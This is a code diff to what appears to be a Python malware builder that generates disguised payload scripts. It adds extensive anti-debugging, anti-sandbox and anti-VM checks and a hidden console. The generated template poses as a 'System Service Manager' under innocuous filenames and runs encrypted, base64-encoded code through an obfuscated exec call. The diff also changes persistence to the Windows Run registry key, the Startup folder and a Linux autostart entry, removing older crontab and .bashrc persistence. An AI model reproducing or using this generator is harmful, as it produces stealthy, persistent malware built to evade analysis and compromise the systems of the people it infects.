@@ -290,14 +290,251 @@ def generate_random_string(length=10):
     """生成随机字符串"""
     return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
 
-def obfuscate_code(code):
-    """简单的代码混淆"""
-    # 添加无用的变量和注释
-    obfuscated = f"""# Auto-generated script - {datetime.datetime.now()}
-import os, sys
-__dummy_var__ = {random.randint(1000, 9999)}
-""" + code
-    return obfuscated
+def create_advanced_evasion_code():
+    """创建高级反检测代码"""
+    evasion_code = '''
+import os
+import sys
+import time
+import random
+import platform
+import subprocess
+import threading
+import ctypes
+from datetime import datetime
+
+# 隐藏控制台窗口 (Windows)
+def hide_console():
+    """隐藏控制台窗口"""
+    if platform.system() == "Windows":
+        try:
+            import ctypes
+            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
+            if hwnd != 0:
+                ctypes.windll.user32.ShowWindow(hwnd, 0)  # SW_HIDE = 0
+        except:
+            pass
+
+# 反调试检测
+def anti_debug_checks():
+    """多重反调试检测"""
+    try:
+        # 检测调试器进程
+        debug_processes = [
+            'ollydbg.exe', 'ProcessHacker.exe', 'tcpview.exe', 'autoruns.exe',
+            'autorunsc.exe', 'filemon.exe', 'procmon.exe', 'regmon.exe',
+            'procexp.exe', 'idaq.exe', 'idaq64.exe', 'ImmunityDebugger.exe',
+            'Wireshark.exe', 'dumpcap.exe', 'HookExplorer.exe', 'ImportREC.exe',
+            'PETools.exe', 'LordPE.exe', 'SysInspector.exe', 'proc_analyzer.exe',
+            'sysAnalyzer.exe', 'sniff_hit.exe', 'winAPIoverride.exe',
+            'apimonitor.exe', 'x32dbg.exe', 'x64dbg.exe', 'windbg.exe',
+            'gdb.exe', 'python.exe', 'pythonw.exe'
+        ]
+        
+        if platform.system() == "Windows":
+            try:
+                output = subprocess.check_output('tasklist', shell=True, 
+                                               stderr=subprocess.DEVNULL).decode('utf-8', errors='ignore')
+                for proc in debug_processes:
+                    if proc.lower() in output.lower():
+                        return False
+            except:
+                pass
+        else:
+            try:
+                output = subprocess.check_output(['ps', 'aux'], 
+                                               stderr=subprocess.DEVNULL).decode('utf-8', errors='ignore')
+                for proc in debug_processes:
+                    if proc.lower() in output.lower():
+                        return False
+            except:
+                pass
+        
+        # 检测Python调试模式
+        if hasattr(sys, 'gettrace') and sys.gettrace() is not None:
+            return False
+            
+        # 检测断点
+        if sys.settrace is not None:
+            return False
+            
+        return True
+    except:
+        return True
+
+# 高级沙箱检测
+def advanced_sandbox_detection():
+    """高级沙箱环境检测"""
+    try:
+        # 1. 时间检测 - 检测时间加速
+        start_time = time.time()
+        time.sleep(1.5)
+        elapsed = time.time() - start_time
+        if elapsed < 1.2:  # 时间被加速
+            return False
+        
+        # 2. 系统资源检测
+        if platform.system() == "Windows":
+            try:
+                # 检测内存大小
+                import psutil
+                memory = psutil.virtual_memory().total / (1024**3)  # GB
+                if memory < 2:  # 内存小于2GB
+                    return False
+                    
+                # 检测CPU核心数
+                cpu_count = psutil.cpu_count()
+                if cpu_count < 2:
+                    return False
+                    
+                # 检测硬盘大小
+                disk = psutil.disk_usage('C:')
+                disk_size = disk.total / (1024**3)  # GB
+                if disk_size < 50:  # 硬盘小于50GB
+                    return False
+            except:
+                pass
+        
+        # 3. 虚拟机特征检测
+        vm_artifacts = [
+            'C:\\\\windows\\\\Sysnative\\\\Drivers\\\\Vmmouse.sys',
+            'C:\\\\windows\\\\Sysnative\\\\Drivers\\\\vm3dgl.dll',
+            'C:\\\\windows\\\\Sysnative\\\\Drivers\\\\vmdum.dll',
+            'C:\\\\windows\\\\Sysnative\\\\Drivers\\\\vm3dver.dll',
+            'C:\\\\windows\\\\Sysnative\\\\Drivers\\\\vmtray.dll',
+            'C:\\\\windows\\\\Sysnative\\\\Drivers\\\\VMToolsHook.dll',
+            'C:\\\\windows\\\\Sysnative\\\\Drivers\\\\vmmousever.dll',
+            'C:\\\\windows\\\\Sysnative\\\\Drivers\\\\vmhgfs.dll',
+            'C:\\\\windows\\\\Sysnative\\\\Drivers\\\\vmGuestLib.dll'
+        ]
+        
+        for artifact in vm_artifacts:
+            if os.path.exists(artifact):
+                return False
+        
+        # 4. 注册表检测 (Windows)
+        if platform.system() == "Windows":
+            try:
+                import winreg
+                vm_keys = [
+                    (winreg.HKEY_LOCAL_MACHINE, "SYSTEM\\\\CurrentControlSet\\\\Enum\\\\SCSI\\\\Disk&Ven_VMware_"),
+                    (winreg.HKEY_LOCAL_MACHINE, "SYSTEM\\\\CurrentControlSet\\\\Control\\\\CriticalDeviceDatabase\\\\root#vmwvmcihostdev"),
+                    (winreg.HKEY_LOCAL_MACHINE, "SOFTWARE\\\\VMware, Inc.\\\\VMware Tools")
+                ]
+                
+                for hkey, key_path in vm_keys:
+                    try:
+                        winreg.OpenKey(hkey, key_path)
+                        return False
+                    except:
+                        continue
+            except:
+                pass
+        
+        # 5. 主机名检测
+        hostname = platform.node().lower()
+        vm_hostnames = ['sandbox', 'malware', 'virus', 'test', 'analysis', 
+                       'vmware', 'virtualbox', 'vbox', 'qemu', 'xen']
+        for vm_name in vm_hostnames:
+            if vm_name in hostname:
+                return False
+        
+        # 6. MAC地址检测
+        try:
+            import uuid
+            mac = hex(uuid.getnode())[2:].upper()
+            vm_macs = [
+                '000569',  # VMware
+                '000C29',  # VMware
+                '001C14',  # VMware
+                '005056',  # VMware
+                '0A0027',  # VirtualBox
+                '080027'   # VirtualBox
+            ]
+            for vm_mac in vm_macs:
+                if mac.startswith(vm_mac):
+                    return False
+        except:
+            pass
+        
+        # 7. 网络连接检测
+        try:
+            import socket
+            test_sites = ['google.com', 'microsoft.com', 'github.com']
+            for site in test_sites:
+                try:
+                    socket.create_connection((site, 80), timeout=3)
+                    break
+                except:
+                    continue
+            else:
+                return False  # 无法连接任何网站
+        except:
+            pass
+        
+        # 8. 鼠标移动检测 (Windows)
+        if platform.system() == "Windows":
+            try:
+                import win32gui
+                pos1 = win32gui.GetCursorPos()
+                time.sleep(2)
+                pos2 = win32gui.GetCursorPos()
+                if pos1 == pos2:  # 鼠标没有移动
+                    return False
+            except:
+                pass
+        
+        return True
+    except:
+        return True
+
+# 反分析延迟
+def analysis_delay(delay_seconds=30):
+    """反分析延迟执行"""
+    try:
+        # 多种延迟方式混合使用
+        delay_methods = [
+            lambda: time.sleep(delay_seconds / 3),
+            lambda: [i for i in range(1000000)],  # CPU密集型操作
+            lambda: time.sleep(delay_seconds / 3),
+        ]
+        
+        for method in delay_methods:
+            method()
+            
+        # 随机额外延迟
+        time.sleep(random.uniform(1, delay_seconds / 6))
+        
+    except:
+        time.sleep(delay_seconds)
+
+# 环境检查主函数
+def comprehensive_environment_check(silent_delay=30):
+    """综合环境检查"""
+    try:
+        # 隐藏控制台
+        hide_console()
+        
+        # 初始延迟
+        analysis_delay(silent_delay)
+        
+        # 反调试检测
+        if not anti_debug_checks():
+            # 执行无害操作并退出
+            time.sleep(random.uniform(10, 30))
+            sys.exit(0)
+        
+        # 沙箱检测
+        if not advanced_sandbox_detection():
+            # 执行无害操作并退出
+            time.sleep(random.uniform(10, 30))
+            sys.exit(0)
+        
+        return True
+    except:
+        return False
+'''
+    return evasion_code
 
 def validate_ip(ip):
     """验证IP地址格式"""
@@ -312,7 +549,7 @@ def validate_port(port):
     except ValueError:
         return False
 
-def gene_shell(encrypted_code, key, output_dir=".", filename=None, add_persistence=False, anti_detection=True):
+def gene_shell(encrypted_code, key, output_dir=".", filename=None, add_persistence=False, anti_detection=True, silent_delay=30):
     """生成Shell文件"""
     # 随机生成变量名以避免特征检测
     var_names = {
@@ -335,58 +572,17 @@ def {junk_func_name}():
     return a + b
 """)
     
-    # 检测规避技术
+    # 高级反检测代码
     evasion_code = ""
     if anti_detection:
-        evasion_code = """
-# 反虚拟机/沙箱检测
-def _check_environment():
-    import platform
-    import socket
-    import os
-    import time
-    
-    # 检测睡眠时间是否被加速（沙箱特征）
-    start_time = time.time()
-    time.sleep(1)
-    elapsed = time.time() - start_time
-    if elapsed < 0.9:  # 如果睡眠时间明显小于预期，可能在沙箱中
-        return False
-    
-    # 检测是否有足够的内存（许多沙箱内存有限）
-    try:
-        mem_info = os.popen('free -m').readlines()[1].split()
-        if int(mem_info[1]) < 512:  # 内存小于512MB，可能是沙箱
-            return False
-    except:
-        pass
-    
-    # 检测常见虚拟机主机名
-    vm_names = ['virtualbox', 'vmware', 'qemu', 'xen', 'bochs', 'sandbox']
-    hostname = platform.node().lower()
-    for vm in vm_names:
-        if vm in hostname:
-            return False
-    
-    # 检测网络连接（沙箱可能有限制）
-    try:
-        socket.create_connection(("www.google.com", 80), 1)
-    except:
-        # 网络连接受限，可能在沙箱中
-        return False
-        
-    return True
-
-# 仅当环境安全时继续执行
-if not _check_environment():
-    # 如果可能在沙箱中，执行无害代码
-    import sys
-    print("Network connectivity check failed.")
-    sys.exit(0)
-"""
+        evasion_code = create_advanced_evasion_code()
     
     # 基本模板，但使用随机变量名
-    template = r"""# -*- coding: utf-8 -*-
+    template = '''# -*- coding: utf-8 -*-
+"""
+System Service Manager
+Manages system monitoring and maintenance tasks
+"""
 import base64 as {base64}
 import re
 import os
@@ -400,30 +596,37 @@ import random
 
 {evasion_code}
 
-{var_s1}=r'''{encrypted_code}'''
+{var_s1}=r"""{encrypted_code}"""
 {var_s2}=r"ZGVmIHBhcnNlS2V5KGtleSk6CiAgICBpZiBrZXkgIT0gIiI6CiAgICAgICAgbyA9IDAKICAgICAgICBmb3IgayBpbiBrZXk6CiAgICAgICAgICAgIG4gPSAwCiAgICAgICAgICAgIGkgPSBzdHIob3JkKGspKQogICAgICAgICAgICBmb3IgdCBpbiBpOgogICAgICAgICAgICAgICAgbiArPSBpbnQodCkKICAgICAgICAgICAgbyArPSBuCiAgICAgICAgd2hpbGUgVHJ1ZToKICAgICAgICAgICAgaWYgbyA8IDEwOgogICAgICAgICAgICAgICAgbyA9IGludChvICogMikKICAgICAgICAgICAgZWxpZiBvID4gMTAwOgogICAgICAgICAgICAgICAgbyA9IGludChvIC8gMikKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHJldHVybiBvCiAgICByZXR1cm4="
 {var_s3}=r"ZGVmIGRlY3J5cHQoZGF0YSxrZXkpOgogICAgaWYgZGF0YSA9PSAiIjoKICAgICAgICByZXR1cm4KICAgIHJlc3VsdCA9ICIiCiAgICBrZXljb2RlMSA9IHBhcnNlS2V5KGtleSkKICAgIGEgPSBsZW4oZGF0YSkgLy8gMgogICAgYjEgPSBkYXRhWzphXQogICAgYjIgPSBkYXRhW2E6XQogICAgYyA9IFtvcmQoZCkgZm9yIGQgaW4gYjFdCiAgICBlID0gW2YgLSBrZXljb2RlMSBmb3IgZiBpbiBjXQogICAgZyA9IHN0cihzdW0oYykpCiAgICBrZXljb2RlMiA9IHBhcnNlS2V5KGcpCiAgICBoID0gW29yZChpKSBmb3IgaSBpbiBiMl0KICAgIGogPSBbayAtIGtleWNvZGUyIGZvciBrIGluIGhdCiAgICBrID0gbGVuKGUpIC8vIDIKICAgIGdyb3VwMSA9IGVbOmtdCiAgICBncm91cDQgPSBlW2s6XQogICAgZ3JvdXAyID0gals6a10KICAgIGdyb3VwMyA9IGpbazpdCiAgICBkYXRhbGVuZ3RoID0gbGVuKGdyb3VwMSkgKyBsZW4oZ3JvdXAyKSArIGxlbihncm91cDMpICsgbGVuKGdyb3VwNCkKICAgIGwgPSBkYXRhbGVuZ3RoIC8vIDQKICAgIG0gPSBbXQogICAgZm9yIG4gaW4gcmFuZ2UobCk6CiAgICAgICAgbS5hcHBlbmQoZ3JvdXAxW25dKQogICAgICAgIG0uYXBwZW5kKGdyb3VwMltuXSkKICAgIG8gPSBbXQogICAgZm9yIHAgaW4gcmFuZ2UobCk6CiAgICAgICAgby5hcHBlbmQoZ3JvdXAzW3BdKQogICAgICAgIG8uYXBwZW5kKGdyb3VwNFtwXSkKICAgIHEgPSBtICsgbwogICAgZm9yIHIgaW4gcToKICAgICAgICBpZiBub3Qgcj09MDoKICAgICAgICAgICAgcmVzdWx0ICs9IGNocihyKQogICAgcmV0dXJuIHJlc3VsdAo="
-{var_key} = r'''{key}'''
+{var_key} = r"""{key}"""
 
 # 避免常见的特征检测
 def {obfuscated_exec}(code):
     getattr(__builtins__, ''.join(['e','x','e','c']))(code)
 
-# 延迟执行以避免自动化分析
-{delay_code}
+def main_service():
+    """主服务函数"""
+    try:
+        # 环境检查
+        if not comprehensive_environment_check({silent_delay}):
+            return
+            
+        # 解码执行
+        {obfuscated_exec}({base64}.b64decode({var_s2}).decode())
+        {obfuscated_exec}({base64}.b64decode({var_s3}).decode())
+        {decrypt_func} = locals()['decrypt']
+        {obfuscated_exec}({decrypt_func}({var_s1},{var_key}))
+        
+    except Exception:
+        # 静默失败
+        pass
 
 {persistence_code}
 
-# 解码执行
-try:
-    {obfuscated_exec}({base64}.b64decode({var_s2}).decode())
-    {obfuscated_exec}({base64}.b64decode({var_s3}).decode())
-    {decrypt_func} = locals()['decrypt']
-    {obfuscated_exec}({decrypt_func}({var_s1},{var_key}))
-except Exception as e:
-    # 记录错误但不暴露详细信息
-    pass
-"""
+if __name__ == "__main__":
+    main_service()
+'''
     
     # 随机导入
     junk_imports = []
@@ -432,18 +635,9 @@ except Exception as e:
     for _ in range(random.randint(2, 5)):
         junk_imports.append(random.choice(potential_imports))
     
-    # 随机延迟代码
-    delay_methods = [
-        f"time.sleep({random.uniform(0.1, 0.5):.2f})",
-        "for _ in range(1000000): pass",
-        """start = time.time()
-while time.time() - start < 0.3:
-    pass"""
-    ]
-    
     persistence_code = ""
     if add_persistence:
-        persistence_code = """
+        persistence_code = '''
 # 持久化代码 (仅用于测试环境)
 def _setup_persistence():
     try:
@@ -453,42 +647,50 @@ def _setup_persistence():
         
         if platform.system() == "Windows":
             # Windows启动项
-            import winreg
-            startup_path = os.path.join(os.environ["APPDATA"], 
-                                       "Microsoft", "Windows", "Start Menu", 
-                                       "Programs", "Startup")
-            target_file = os.path.join(startup_path, os.path.basename(current_file))
-            shutil.copy2(current_file, target_file)
-            
-            # 注册表启动项
-            key = winreg.HKEY_CURRENT_USER
-            key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
-            
-            with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as registry_key:
-                winreg.SetValueEx(registry_key, "SystemService", 0, winreg.REG_SZ, target_file)
+            try:
+                import winreg
+                startup_path = os.path.join(os.environ.get("APPDATA", ""), 
+                                           "Microsoft", "Windows", "Start Menu", 
+                                           "Programs", "Startup")
+                if os.path.exists(startup_path):
+                    target_file = os.path.join(startup_path, "SystemService.py")
+                    shutil.copy2(current_file, target_file)
+                
+                # 注册表启动项
+                key = winreg.HKEY_CURRENT_USER
+                key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+                
+                with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as registry_key:
+                    winreg.SetValueEx(registry_key, "SystemMonitor", 0, winreg.REG_SZ, current_file)
+            except:
+                pass
                 
         elif platform.system() == "Linux":
-            # Linux crontab
-            home_dir = os.path.expanduser("~")
-            hidden_dir = os.path.join(home_dir, ".config", "services")
-            os.makedirs(hidden_dir, exist_ok=True)
-            
-            target_file = os.path.join(hidden_dir, ".system_service.py")
-            shutil.copy2(current_file, target_file)
-            
-            # 添加到crontab
-            os.system(f'(crontab -l 2>/dev/null; echo "@reboot python3 {target_file}") | crontab -')
-            
-            # 添加到.bashrc
-            bashrc = os.path.join(home_dir, ".bashrc")
-            with open(bashrc, "a") as f:
-                f.write(f"\\n# System service\\npython3 {target_file} &\\n")
+            # Linux自启动
+            try:
+                home_dir = os.path.expanduser("~")
+                autostart_dir = os.path.join(home_dir, ".config", "autostart")
+                os.makedirs(autostart_dir, exist_ok=True)
+                
+                desktop_file = os.path.join(autostart_dir, "system-monitor.desktop")
+                with open(desktop_file, "w") as f:
+                    f.write(f"""[Desktop Entry]
+Type=Application
+Name=System Monitor
+Exec=python3 {current_file}
+Hidden=false
+NoDisplay=false
+X-GNOME-Autostart-enabled=true
+""")
+            except:
+                pass
     except:
         pass
 
-# 尝试设置持久化
-_setup_persistence()
-"""
+# 如果启用持久化，尝试设置
+if ''' + str(add_persistence).lower() + ''':
+    _setup_persistence()
+'''
     
     # 填充模板
     content = template.format(
@@ -506,7 +708,8 @@ _setup_persistence()
         base64=var_names['base64'],
         decrypt_func=var_names['decrypt'],
         obfuscated_exec=''.join(random.choices(string.ascii_lowercase, k=10)),
-        delay_code=random.choice(delay_methods)
+        silent_delay=silent_delay,
+        add_persistence=str(add_persistence).lower()
     )
     
     # 随机生成文件名，使用更通用的名称避免特征检测
@@ -514,7 +717,7 @@ _setup_persistence()
         legitimate_names = [
             "system_monitor.py", "network_service.py", "update_checker.py",
             "connectivity.py", "maintenance.py", "data_sync.py",
-            "cloud_client.py", "config_updater.py"
+            "cloud_client.py", "config_updater.py", "service_manager.py"
         ]
         filename = random.choice(legitimate_names)
     
@@ -697,6 +900,7 @@ def command_line_mode():
     parser.add_argument('--anti-detection', action='store_true', help='添加反杀毒特征')
     parser.add_argument('--use-dropper', action='store_true', help='使用分阶段执行模式')
     parser.add_argument('--quiet', action='store_true', help='静默模式')
+    parser.add_argument('--silent-delay', default=30, type=int, help='静默延迟时间（秒），在执行危险操作前等待')
     
     return parser.parse_args()
 
@@ -716,7 +920,8 @@ def main():
                 'filename': args.filename,
                 'persistence': args.persistence,
                 'anti_detection': args.anti_detection,
-                'use_dropper': args.use_dropper
+                'use_dropper': args.use_dropper,
+                'silent_delay': args.silent_delay
             }
             quiet = args.quiet
         else:
@@ -762,7 +967,8 @@ def main():
                 config['output_dir'], 
                 config['filename'],
                 config['persistence'],
-                config['anti_detection']
+                config['anti_detection'],
+                config.get('silent_delay', 30)
             )
         
         # 创建配置文件
